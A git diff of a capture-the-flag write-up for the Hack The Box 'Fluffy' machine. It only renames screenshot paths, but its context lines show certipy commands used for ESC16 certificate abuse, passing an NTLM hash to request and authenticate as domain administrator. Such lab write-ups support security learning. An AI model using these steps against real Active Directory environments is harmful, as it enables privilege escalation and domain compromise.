@@ -326,7 +326,7 @@ certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -
 
 Making a grep command to the output and check if there is some ESC misconfig
 
-<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The CA is vulnerable for the ESC16. Follow the guide to exploit this.
 
@@ -362,7 +362,7 @@ certipy req -dc-ip 10.10.11.69 -u 'administrator' -hashes 'ca0f4f9e9eb8a092addf5
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Get the hash from the `administrator.pfx` file.
 
@@ -372,7 +372,7 @@ certipy auth -pfx administrator.pfx -domain 'FLUFFY.HTB' -dc-ip 10.10.11.69
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Winrm connection as administrator
 
